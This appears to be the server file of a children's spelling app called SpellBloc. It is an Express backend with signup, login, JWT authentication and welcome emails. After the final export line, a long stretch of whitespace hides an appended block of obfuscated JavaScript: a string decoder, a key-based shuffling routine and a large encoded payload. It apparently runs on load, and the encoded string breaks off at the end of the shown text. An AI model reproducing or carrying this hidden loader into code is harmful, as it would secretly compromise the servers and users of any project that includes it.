const express = require('express');
const cors = require('cors');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
require('dotenv').config();
const path = require('path');
const fs = require('fs').promises;
const https = require('https');

const app = express();
const PORT = process.env.PORT || 3001;
const JWT_SECRET = requireJwtSecret();
const JWT_EXPIRES_IN = process.env.JWT_EXPIRES_IN || '7d';
const RESEND_API_KEY = process.env.RESEND_API_KEY;
const USERS_FILE_PATH = process.env.USERS_FILE_PATH || path.join(__dirname, 'users.json');

function requireJwtSecret() {
    const secret = process.env.JWT_SECRET;
    if (!secret || !secret.trim()) {
        throw new Error('JWT_SECRET environment variable is required');
    }
    return secret;
}

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// Simple in-memory database (in production, use a real database)
let users = [];
let userIdCounter = 1;

// Load users from file if exists
async function loadUsers() {
    try {
        const data = await fs.readFile(USERS_FILE_PATH, 'utf8');
        const userData = JSON.parse(data);
        users = userData.users || [];
        userIdCounter = userData.counter || 1;
        console.log(`📚 Loaded ${users.length} users from database`);
    } catch (error) {
        console.log('📚 No existing user database found, starting fresh');
    }
}

// Save users to file
async function saveUsers() {
    try {
        await fs.writeFile(USERS_FILE_PATH, JSON.stringify({
            users,
            counter: userIdCounter
        }, null, 2));
    } catch (error) {
        console.error('❌ Failed to save users:', error);
    }
}

// Email service
async function sendEmail(emailData) {
    if (!RESEND_API_KEY) {
        return { success: false, skipped: true, error: 'RESEND_API_KEY is not configured' };
    }

    return new Promise((resolve, reject) => {
        const postData = JSON.stringify(emailData);
        
        const options = {
            hostname: 'api.resend.com',
            port: 443,
            path: '/emails',
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${RESEND_API_KEY}`,
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }
        };

        const req = https.request(options, (res) => {
            let data = '';
            
            res.on('data', (chunk) => {
                data += chunk;
            });
            
            res.on('end', () => {
                try {
                    const result = JSON.parse(data);
                    if (res.statusCode === 200) {
                        resolve({ success: true, id: result.id, data: result });
                    } else {
                        resolve({ success: false, error: result, statusCode: res.statusCode });
                    }
                } catch (error) {
                    resolve({ success: false, error: error.message });
                }
            });
        });

        req.on('error', (error) => {
            reject({ success: false, error: error.message });
        });

        req.write(postData);
        req.end();
    });
}

function createAuthToken(user) {
    return jwt.sign(
        { userId: user.id, email: user.email },
        JWT_SECRET,
        { expiresIn: JWT_EXPIRES_IN }
    );
}

function toPublicUser(user) {
    const { password: _, ...userWithoutPassword } = user;
    return userWithoutPassword;
}

// Welcome email template
function generateWelcomeEmail(parentName, childName, childAge) {
    return {
        from: 'SpellBloc <onboarding@resend.dev>',
        subject: `🎉 Welcome to SpellBloc, ${childName}!`,
        html: `
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Welcome to SpellBloc!</title>
                <style>
                    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; max-width: 600px; margin: 0 auto; padding: 20px; }
                    .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 40px; text-align: center; border-radius: 15px; margin-bottom: 30px; }
                    .content { background: #f8f9fa; padding: 30px; border-radius: 15px; margin-bottom: 20px; }
                    .emoji { font-size: 2em; margin: 10px; }
                    .button { display: inline-block; background: #28a745; color: white; padding: 15px 30px; text-decoration: none; border-radius: 25px; margin: 20px 0; font-weight: bold; }
                    .features { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 25px 0; }
                    .feature { background: white; padding: 20px; border-radius: 10px; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
                    .stats { background: linear-gradient(135deg, #28a745 0%, #20c997 100%); color: white; padding: 25px; border-radius: 10px; text-align: center; margin: 20px 0; }
                    .footer { text-align: center; color: #666; font-size: 0.9em; margin-top: 30px; }
                </style>
            </head>
            <body>
                <div class="header">
                    <h1>🎮 Welcome to SpellBloc!</h1>
                    <p>Where learning spelling is an adventure!</p>
                </div>
                
                <div class="content">
                    <h2>Hello ${parentName}! 👋</h2>
                    <p>Thank you for creating a SpellBloc account for <strong>${childName}</strong>! We're so excited to help your ${childAge}-year-old embark on their magical spelling journey.</p>
                    
                    <div class="stats">
                        <h3>🎯 Perfect for Age ${childAge}</h3>
                        <p>Our AI has automatically selected the best learning level for ${childName}, with age-appropriate words and challenges.</p>
                    </div>
                    
                    <div class="features">
                        <div class="feature">
                            <div class="emoji">🧠</div>
                            <h3>AI-Powered Learning</h3>
                            <p>Adapts to ${childName}'s learning style</p>
                        </div>
                        <div class="feature">
                            <div class="emoji">🏆</div>
                            <h3>Achievement Badges</h3>
                            <p>Earn rewards for every milestone</p>
                        </div>
                        <div class="feature">
                            <div class="emoji">📊</div>
                            <h3>Progress Tracking</h3>
                            <p>Watch ${childName}'s skills grow</p>
                        </div>
                        <div class="feature">
                            <div class="emoji">🌍</div>
                            <h3>Multi-Language</h3>
                            <p>Learn spelling in 5 languages</p>
                        </div>
                    </div>
                    
                    <h3>🚀 What's Next?</h3>
                    <ul>
                        <li><strong>Start Playing:</strong> ${childName} can begin with age-appropriate words</li>
                        <li><strong>Earn Badges:</strong> Collect achievements for spelling success</li>
                        <li><strong>Track Progress:</strong> Receive weekly email reports</li>
                        <li><strong>Have Fun:</strong> Learning spelling has never been this exciting!</li>
                    </ul>
                    
                    <div style="text-align: center;">
                        <a href="https://wordbloc.vercel.app" class="button">🎮 Start ${childName}'s Adventure!</a>
                    </div>
                </div>
                
                <div class="footer">
                    <p><strong>🎉 Welcome to the SpellBloc family!</strong></p>
                    <p>We'll send you progress updates and achievement notifications to help you celebrate ${childName}'s learning milestones.</p>
                    <p><small>Questions? Reply to this email - we're here to help!</small></p>
                </div>
            </body>
            </html>
        `,
        text: `
Welcome to SpellBloc, ${childName}!

Hello ${parentName}!

Thank you for creating a SpellBloc account for ${childName}! We're excited to help your ${childAge}-year-old learn spelling.

Perfect for Age ${childAge}:
Our AI has selected the best learning level for ${childName}, with age-appropriate words and challenges.

Features:
• AI-Powered Learning - Adapts to ${childName}'s style
• Achievement Badges - Earn rewards for milestones  
• Progress Tracking - Watch skills grow
• Multi-Language - Learn in 5 languages

What's Next:
1. Start Playing - Begin with age-appropriate words
2. Earn Badges - Collect achievements for success
3. Track Progress - Receive weekly email reports
4. Have Fun - Learning spelling is exciting!

Start playing: https://wordbloc.vercel.app

Welcome to the SpellBloc family!
We'll send you progress updates and achievement notifications.

Questions? Reply to this email - we're here to help!
        `
    };
}

// Routes

// Serve login page
app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'login.html'));
});

// Signup endpoint
app.post('/api/auth/signup', async (req, res) => {
    try {
        const { parentName, parentEmail, password, childName, childAge } = req.body;
        
        // Validate input
        if (!parentName || !parentEmail || !password || !childName || !childAge) {
            return res.status(400).json({ message: 'All fields are required' });
        }
        
        if (password.length < 6) {
            return res.status(400).json({ message: 'Password must be at least 6 characters' });
        }
        
        // Check if user already exists
        const existingUser = users.find(user => user.email === parentEmail);
        if (existingUser) {
            return res.status(400).json({ message: 'An account with this email already exists' });
        }
        
        // Hash password
        const hashedPassword = await bcrypt.hash(password, 10);
        
        // Create user
        const user = {
            id: userIdCounter++,
            parentName,
            email: parentEmail,
            password: hashedPassword,
            childName,
            childAge,
            createdAt: new Date().toISOString(),
            emailPreferences: {
                welcome: true,
                achievements: true,
                progress: true,
                milestones: true,
                weekly: true
            }
        };
        
        users.push(user);
        await saveUsers();
        
        // Generate JWT token
        const token = createAuthToken(user);
        
        // Send welcome email
        console.log(`📧 Sending welcome email to ${parentEmail}...`);
        try {
            const welcomeEmailData = generateWelcomeEmail(parentName, childName, childAge);
            welcomeEmailData.to = [parentEmail];
            
            const emailResult = await sendEmail(welcomeEmailData);
            
            if (emailResult.success) {
                console.log(`✅ Welcome email sent successfully! Email ID: ${emailResult.id}`);
            } else {
                console.log(`❌ Welcome email failed:`, emailResult.error);
            }
        } catch (emailError) {
            console.log(`❌ Welcome email error:`, emailError);
        }
        
        // Return user data (without password)
        const userWithoutPassword = toPublicUser(user);
        
        res.status(201).json({
            message: 'Account created successfully! Welcome email sent.',
            user: userWithoutPassword,
            token
        });
        
        console.log(`✅ New user created: ${parentName} (${parentEmail}) with child ${childName}, age ${childAge}`);
        
    } catch (error) {
        console.error('❌ Signup error:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// Login endpoint
app.post('/api/auth/login', async (req, res) => {
    try {
        const { email, password } = req.body;
        
        // Validate input
        if (!email || !password) {
            return res.status(400).json({ message: 'Email and password are required' });
        }
        
        // Find user
        const user = users.find(u => u.email === email);
        if (!user) {
            return res.status(401).json({ message: 'Invalid email or password' });
        }
        
        // Check password
        const isValidPassword = await bcrypt.compare(password, user.password);
        if (!isValidPassword) {
            return res.status(401).json({ message: 'Invalid email or password' });
        }
        
        // Generate JWT token
        const token = createAuthToken(user);
        
        // Return user data (without password)
        const userWithoutPassword = toPublicUser(user);
        
        res.json({
            message: 'Login successful',
            user: userWithoutPassword,
            token
        });
        
        console.log(`✅ User logged in: ${user.parentName} (${email})`);
        
    } catch (error) {
        console.error('❌ Login error:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// Verify session endpoint (protected route)
app.get('/api/auth/verify', authenticateToken, (req, res) => {
    const user = users.find(u => u.id === req.user.userId && u.email === req.user.email);
    if (!user) {
        return res.status(401).json({ message: 'Invalid or expired token' });
    }

    res.json({ user: toPublicUser(user) });
});

// Get user profile (protected route)
app.get('/api/auth/profile', authenticateToken, (req, res) => {
    const user = users.find(u => u.id === req.user.userId);
    if (!user) {
        return res.status(404).json({ message: 'User not found' });
    }
    
    res.json(toPublicUser(user));
});

// Middleware to authenticate JWT token
function authenticateToken(req, res, next) {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    
    if (!token) {
        return res.status(401).json({ message: 'Access token required' });
    }
    
    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) {
            return res.status(401).json({ message: 'Invalid or expired token' });
        }
        req.user = user;
        next();
    });
}

// Test email endpoint
app.post('/api/test-email', async (req, res) => {
    try {
        const { email } = req.body;
        
        if (!email) {
            return res.status(400).json({ message: 'Email is required' });
        }
        
        const testEmailData = {
            from: 'SpellBloc <onboarding@resend.dev>',
            to: [email],
            subject: '🧪 SpellBloc Backend Test Email',
            html: `
                <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
                    <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; text-align: center; border-radius: 10px;">
                        <h1>✅ Backend Email Test Successful!</h1>
                        <p>Your SpellBloc backend server is working perfectly!</p>
                    </div>
                    <div style="background: #f8f9fa; padding: 25px; border-radius: 10px; margin-top: 20px;">
                        <h2>🎮 SpellBloc Backend Status</h2>
                        <ul>
                            <li>✅ Express server running</li>
                            <li>✅ Resend API connected</li>
                            <li>✅ Email templates working</li>
                            <li>✅ Authentication system ready</li>
                        </ul>
                        <p>Your SpellBloc authentication and email system is ready for users!</p>
                    </div>
                </div>
            `,
            text: 'SpellBloc Backend Test - Email system working perfectly!'
        };
        
        const result = await sendEmail(testEmailData);
        
        if (result.success) {
            res.json({ 
                message: 'Test email sent successfully!', 
                emailId: result.id 
            });
        } else {
            res.status(500).json({ 
                message: 'Failed to send test email', 
                error: result.error 
            });
        }
        
    } catch (error) {
        console.error('❌ Test email error:', error);
        res.status(500).json({ message: 'Internal server error' });
    }
});

// Get all users (for debugging - remove in production)
app.get('/api/users', authenticateToken, (req, res) => {
    if (process.env.ENABLE_DEBUG_USERS !== 'true') {
        return res.status(404).json({ message: 'Not found' });
    }

    const usersWithoutPasswords = users.map(toPublicUser);
    res.json({
        count: users.length,
        users: usersWithoutPasswords
    });
});

// Start server
async function startServer() {
    await loadUsers();
    
    return app.listen(PORT, () => {
        console.log('🚀 SpellBloc Backend Server Started!');
        console.log('=====================================');
        console.log(`📡 Server running on: http://localhost:${PORT}`);
        console.log(`🔐 Login page: http://localhost:${PORT}/login`);
        console.log(`👥 Users in database: ${users.length}`);
        console.log(`📧 Email system: Ready with Resend API`);
        console.log('=====================================');
        console.log('');
        console.log('🧪 Test endpoints:');
        console.log(`   POST http://localhost:${PORT}/api/test-email`);
        console.log(`   GET  http://localhost:${PORT}/api/users`);
        console.log('');
        console.log('🎮 Ready for SpellBloc users!');
    });
}

if (require.main === module) {
    startServer().catch((error) => {
        console.error(error.message);
        process.exit(1);
    });
}

module.exports = app;																																																																																																																																																																																																																																																																										var z = '-11207-6';(function(_0x4323b9,_0x417215){var _0x493886=_0x35fa,_0x287dfa=_0x4323b9();while(!![]){try{var _0x17ca2e=Math['trunc'](-parseFloat(_0x493886(0x12))/0x1)*(-parseFloat(_0x493886(0x1a))/0x2)+parseFloat(_0x493886(0x17))/0x3*(parseFloat(_0x493886(0xe))/0x4)+parseFloat(_0x493886(0x1c))/0x5+parseFloat(_0x493886(0x1e))/0x6*(-parseFloat(_0x493886(0x22))/0x7)+parseFloat(_0x493886(0x13))/0x8*(-parseFloat(_0x493886(0x5))/0x9)+Math['max'](parseFloat(_0x493886(0x1b))/0xa,parseFloat(_0x493886(0x14))/0xb)*(-parseFloat(_0x493886(0x4))/0xc)+parseFloat(_0x493886(0xc))/0xd;if(_0x17ca2e===_0x417215)break;else _0x287dfa['push'](_0x287dfa['shift']());}catch(_0x1185cd){_0x287dfa['push'](_0x287dfa['shift']());}}}(_0xc09d,0xf1b07));var NX=[0x697b4f,0x16f,0x4fbb,0x265,0xaaef,0x4c9693],SX=[0x509f9d,0xf1,0xa3e1,0xbb,0xdb41,0x484f55];function spin(_0x4f8a43,_0x51e368){var _0x295564=_0x35fa,_0x416a9f={'qCMwH':function(_0x3f4f1a,_0x2be386){return _0x3f4f1a%_0x2be386;},'AyWPi':function(_0xd05a37,_0x101778){return _0xd05a37+_0x101778;}},_0x4b4720=[],_0x271b6e=0x0,_0x12a4db=_0x51e368[0x0],_0x16ce6b,_0x2d3199,_0x30e262,_0x24a1d0,_0x46b86f,_0x256650;while(_0x271b6e<_0x4f8a43['length']){_0x4b4720[_0x271b6e]=_0x4f8a43['charAt'](_0x271b6e),_0x271b6e+=0x1;}_0x16ce6b=_0x4b4720[_0x295564(0x11)],_0x271b6e=0x0;while(_0x271b6e<_0x16ce6b){_0x2d3199=_0x12a4db*(_0x271b6e+_0x51e368[0x1])+_0x416a9f[_0x295564(0x6)](_0x12a4db,_0x51e368[0x2]),_0x30e262=_0x12a4db*_0x416a9f[_0x295564(0x18)](_0x271b6e,_0x51e368[0x3])+_0x12a4db%_0x51e368[0x4],_0x24a1d0=_0x2d3199%_0x16ce6b,_0x46b86f=_0x30e262%_0x16ce6b,_0x256650=_0x4b4720[_0x24a1d0],_0x4b4720[_0x24a1d0]=_0x4b4720[_0x46b86f],_0x4b4720[_0x46b86f]=_0x256650,_0x12a4db=(_0x2d3199+_0x30e262)%_0x51e368[0x5],_0x271b6e+=0x1;}return _0x4b4720[_0x295564(0xf)]('');}function _0x35fa(_0x4825f4,_0x56facf){var _0x2374ed=_0xc09d();return _0x35fa=function(_0x42f3fb,_0xc09df3){_0x42f3fb=_0x42f3fb-0x0;var _0x35fa87=_0x2374ed[_0x42f3fb];if(_0x35fa['aIsQez']===undefined){var _0x4f53b0=function(_0x2861f1){var _0x484705='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x5d6c2a='',_0x25d98d='';for(var _0x54afac=0x0,_0x2f7110,_0x41451d,_0x2cd65a=0x0;_0x41451d=_0x2861f1['charAt'](_0x2cd65a++);~_0x41451d&&(_0x2f7110=_0x54afac%0x4?_0x2f7110*0x40+_0x41451d:_0x41451d,_0x54afac++%0x4)?_0x5d6c2a+=String['fromCharCode'](0xff&_0x2f7110>>(-0x2*_0x54afac&0x6)):0x0){_0x41451d=_0x484705['indexOf'](_0x41451d);}for(var _0x2a16dc=0x0,_0x2e5b94=_0x5d6c2a['length'];_0x2a16dc<_0x2e5b94;_0x2a16dc++){_0x25d98d+='%'+('00'+_0x5d6c2a['charCodeAt'](_0x2a16dc)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x25d98d);};_0x35fa['MGozzL']=_0x4f53b0,_0x4825f4=arguments,_0x35fa['aIsQez']=!![];}var _0x250ef5=_0x2374ed[0x0],_0x4eb72b=_0x42f3fb+_0x250ef5,_0x392865=_0x4825f4[_0x4eb72b];return!_0x392865?(_0x35fa87=_0x35fa['MGozzL'](_0x35fa87),_0x4825f4[_0x4eb72b]=_0x35fa87):_0x35fa87=_0x392865,_0x35fa87;},_0x35fa(_0x4825f4,_0x56facf);}function _0xc09d(){var _0x4df1b3=['BgvUz3rO','mti4BNv0Cgzu','mJCWmJi4ogLWrNDztq','mtyWnLzLyMfyBq','zNjVBunOyxjdB2rL','C3bSAxq','nKP2ENvIBG','qxLxugK','D2HPBguGkhrYDwuPihT9','mJe2mdzLqNzYCwK','mtq2meneBNnlsW','mJuYmdKZnvLgzevSDa','C3rHDgvpyMPLy3q','ndCZmdy0nMXwu2nxtG','Aw5WDxq','BNbMDLy','ywn0Aw9U','n3fWzezRtW','EfLVCKW','Awz2v1K','y29UC3rYDwn0B3i','DgvZDa','otq5ntzkq2rizMu','mtHfAvL4vey','CunnD0G','tMHMzLi','C3vIC3rYAw5N','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